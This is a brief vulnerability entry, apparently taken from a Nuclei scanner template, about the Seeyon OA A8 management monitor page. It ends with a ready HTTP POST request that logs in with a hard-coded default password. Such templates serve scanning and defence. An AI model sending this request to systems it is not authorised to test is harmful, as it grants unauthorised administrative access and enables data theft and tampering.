# Vulnerability: Seeyon A8 Management Monitor - Default Login
**Classification:** SEEYON
**Source:** Nuclei Template (`seeyon-monitor-default-login.yaml`)

## Description
Seeyon OA A8-m has status monitoring page information leakage. Attackers can obtain sensitive information such as website paths and user names for further attacks. Attackers can use this vulnerability to directly enter the application system or management system to conduct system, web page, data tampering and deletion, illegally obtaining system and user data, and may even cause the server to collapse.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /seeyon/management/index.jsp HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

password=WLCCYBD%40SEEYON
```

